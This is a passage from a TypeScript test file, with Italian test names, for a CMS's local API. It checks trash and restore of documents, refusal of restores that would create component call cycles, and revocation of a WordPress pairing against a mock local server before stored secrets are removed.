    expect(await queued.json()).toMatchObject({ recoveryAvailable: true, remoteSyncRequired: false, scope: "local", deleted: [{ id: previous.id, kind: "document", label: previousLabel }] });

    const details = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers });
    expect(details.status).toBe(200);
    const detailBody = await details.json() as { pages: Array<{ id: string }>; recoverableDeletions: Array<{ id: string; kind: string }> };
    expect(detailBody.pages.map((page) => page.id)).not.toContain(previous.id);
    expect(detailBody.recoverableDeletions).toContainEqual(expect.objectContaining({ id: previous.id, kind: "document" }));

    const reopened = await catalog.openProject(project.id);
    if (!reopened) throw new Error("Il progetto non si è riaperto.");
    try {
      expect(reopened.store.listTransferTombstones("local").map((entity) => entity.id)).toContain(previous.id);
      expect(reopened.store.listTransferTombstones("remote").map((entity) => entity.id)).not.toContain(previous.id);
      const nextProfile = await createStaticPageProfile(reopened.project, reopened.store);
      expect(nextProfile.profile.entities.map((entity) => entity.id)).not.toContain(previous.id);
    } finally {
      reopened.store.close();
    }

    const restored = await fetch(`${base}/api/cms/v1/projects/${project.id}/recovery/tombstones/${previous.id}`, { method: "POST", headers });
    expect(restored.status).toBe(200);
    expect(await restored.json()).toEqual({ restored: true, id: previous.id });
    const after = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers });
    const afterBody = await after.json() as { pages: Array<{ id: string }>; recoverableDeletions: unknown[] };
    expect(afterBody.pages.map((page) => page.id)).toContain(previous.id);
    expect(afterBody.recoverableDeletions).toEqual([]);
  });

  it("rifiuta con 409 il ripristino di un componente che chiuderebbe un ciclo, e lo lascia nel Cestino", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const catalog = new CmsProjectCatalog(dataDirectory);
    const { project, store } = await catalog.createProject("Ripristino e cicli");
    const calling = (ref: string) => `<!-- wp:xb/component {"uid":"${randomUUID().replaceAll("-", "").slice(0, 10)}","ref":"${ref}"} /-->`;
    const c = store.createComponent({ ref: "ui/c", title: "C" });
    const b = store.createComponent({ ref: "ui/b", title: "B", content: calling("ui/c") });
    const a = store.createComponent({ ref: "ui/a", title: "A", content: calling("ui/b") });
    store.close();
    const headers = { "X-Histos-Token": server.token, Origin: base, "Content-Type": "application/json" };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    // ui/a and ui/b to the local Trash, then ui/a back: its call to ui/b, still deleted, is no edge.
    const trashed = await fetch(`${projectPath}/trash`, { method: "POST", headers, body: JSON.stringify({ entityIds: [a.id, b.id] }) });
    expect(trashed.status, await trashed.clone().text()).toBe(200);
    expect((await fetch(`${projectPath}/recovery/tombstones/${a.id}`, { method: "POST", headers })).status).toBe(200);
    // While ui/b is deleted, ui/c may call ui/a.
    const reopened = await catalog.openProject(project.id);
    try {
      const current = reopened!.store.getComponentById(c.id)!;
      expect(reopened!.store.saveComponent({ alias: current.alias, expectedHead: current.headRevision, ref: current.ref, content: calling("ui/a"), schema: current.schema }).status).toBe("saved");
    } finally { reopened?.store.close(); }
    // Before: 200, and ui/a → ui/b → ui/c → ui/a in the project.
    const refused = await fetch(`${projectPath}/recovery/tombstones/${b.id}`, { method: "POST", headers });
    expect(refused.status).toBe(409);
    expect(await refused.json()).toMatchObject({ code: "cms-recovery-restore-conflict", error: "Non è possibile ripristinare il componente ui/b: chiuderebbe un ciclo di richiami (ui/b → ui/c → ui/a → ui/b), e i componenti Histeon non possono richiamarsi in modo ricorsivo. Togli prima uno di questi richiami, per esempio quello a ui/b in ui/a, poi ripristinalo." });
    const details = await (await fetch(projectPath, { headers })).json() as { components: Array<{ id: string }>; recoverableDeletions: Array<{ id: string }> };
    expect(details.components.map((component) => component.id)).not.toContain(b.id);
    expect(details.recoverableDeletions.map((deletion) => deletion.id)).toEqual([b.id]);
  });

  it("revoca il pairing WordPress prima di rimuovere il collegamento locale", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    let remoteStatus = 503;
    let remoteCode = "xb_cms_refused";
    let revocationRequests = 0;
    const remote = createServer((request, response) => {
      revocationRequests += 1;
      expect(request.method).toBe("POST");
      expect(new URL(request.url ?? "/", "http://localhost").searchParams.get("rest_route")).toBe("/xb/v1/cms/v1/revoke");
      expect(request.headers["x-histos-signature"]).toMatch(/^[a-f0-9]{64}$/u);
      response.writeHead(remoteStatus, { "Content-Type": "application/json" });
      response.end(JSON.stringify(remoteStatus === 200 ? { revoked: true } : remoteStatus === 401 ? { code: remoteCode, message: "Richiesta non autorizzata." } : { message: "temporaneamente non disponibile" }));
    });
    await new Promise<void>((resolve, reject) => {
      remote.once("error", reject);
      remote.listen(0, "127.0.0.1", resolve);
    });
    const address = remote.address();
    if (!address || typeof address === "string") throw new Error("Il server remoto di prova non ha una porta.");
    const catalog = new CmsRemoteCatalog(dataDirectory);
    const id = randomUUID();
    const connection = catalog.add({
      id, url: `http://localhost:${address.port}`, siteId: randomUUID(), projectId: randomUUID(),
      projectName: "WordPress di prova", profile: "histos-static-project-v3", read: true, write: true, publish: false,
    });
    const secretKey = `cms-remote-${id}`;
    secretValues.set(secretKey, Buffer.alloc(32, 7).toString("base64url"));
    const headers = { "X-Histos-Token": server.token, Origin: base };
    try {
      const unavailable = await fetch(`${base}/api/cms/v1/connections/${id}`, { method: "DELETE", headers });
      expect(unavailable.status).toBe(409);
      expect(await unavailable.json()).toMatchObject({ code: "cms-remote-revoke-unconfirmed" });
      expect(catalog.get(id)).not.toBeNull();
      expect(secretValues.has(secretKey)).toBe(true);

      // A 401 that is not the bridge saying the pairing is gone (clock skew, proxy, WAF) confirms nothing.
      remoteStatus = 401;
      const refused = await fetch(`${base}/api/cms/v1/connections/${id}`, { method: "DELETE", headers });
      expect(refused.status).toBe(409);
      expect(await refused.json()).toMatchObject({ code: "cms-remote-revoke-unconfirmed" });
      expect(secretValues.has(secretKey)).toBe(true);
      revocationRequests -= 1;

      remoteStatus = 200;
      const removed = await fetch(`${base}/api/cms/v1/connections/${id}`, { method: "DELETE", headers });
      expect(removed.status).toBe(200);
      expect(await removed.json()).toMatchObject({ removed: true, id, remoteAccess: "revoked" });
      expect(catalog.get(id)).toBeNull();
      expect(secretValues.has(secretKey)).toBe(false);
      expect(revocationRequests).toBe(2);

      const localOnlyId = randomUUID();
      catalog.add({
        id: localOnlyId, url: `http://localhost:${address.port}`, siteId: randomUUID(), projectId: null,
        projectName: "WordPress offline", profile: "histos-static-project-v3", read: true, write: false, publish: false,
      });
      const localSecretKey = `cms-remote-${localOnlyId}`;
      secretValues.set(localSecretKey, Buffer.alloc(32, 9).toString("base64url"));
      const localOnly = await fetch(`${base}/api/cms/v1/connections/${localOnlyId}?localOnly=true`, { method: "DELETE", headers });
      expect(localOnly.status).toBe(200);
      expect(await localOnly.json()).toMatchObject({ removed: true, id: localOnlyId, remoteAccess: "left-active" });
      expect(revocationRequests).toBe(2);
      expect(secretValues.has(localSecretKey)).toBe(false);
      expect(catalog.get(localOnlyId)).toBeNull();
    } finally {
      catalog.close();
      await new Promise<void>((resolve, reject) => remote.close((error) => error ? reject(error) : resolve()));
    }
  });
});
